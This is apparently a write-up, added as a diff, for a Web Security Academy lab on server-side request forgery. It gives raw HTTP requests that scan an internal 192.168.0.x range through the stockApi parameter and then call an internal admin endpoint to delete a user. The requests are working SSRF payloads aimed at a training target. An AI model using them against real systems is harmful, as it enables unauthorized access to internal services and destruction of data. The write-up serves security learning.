@@ -1,0 +1,34 @@
+Basic SSRF against another back-end system
+
+The hints and the solution provided are great.
+After you click check stock on a product, send the request to intruder and place the payload on the last octet:
+
+POST /product/stock HTTP/1.1
+Host: acb61f141e725635800d36d9009900bd.web-security-academy.net
+Content-Length: 96
+Connection: close
+Cookie: session=MSZTy0RvyiSPzSHv8bRgT88E1stOx3At
+
+stockApi=http://192.168.0.§1§:8080/admin
+
+Set the payload as numbers, From 1 To 255 Step 1.
+
+In my case 192.168.0.21 worked:
+
+POST /product/stock HTTP/1.1
+Host: acb61f141e725635800d36d9009900bd.web-security-academy.net
+Content-Length: 39
+Connection: close
+Cookie: session=MSZTy0RvyiSPzSHv8bRgT88E1stOx3At
+
+stockApi=http://192.168.0.21:8080/admin
+
+Send it to repeater and add the API call to delete carlos:
+
+POST /product/stock HTTP/1.1
+Host: acb61f141e725635800d36d9009900bd.web-security-academy.net
+Content-Length: 62
+Connection: close
+Cookie: session=MSZTy0RvyiSPzSHv8bRgT88E1stOx3At
+
+stockApi=http://192.168.0.21:8080/admin/delete?username=carlos
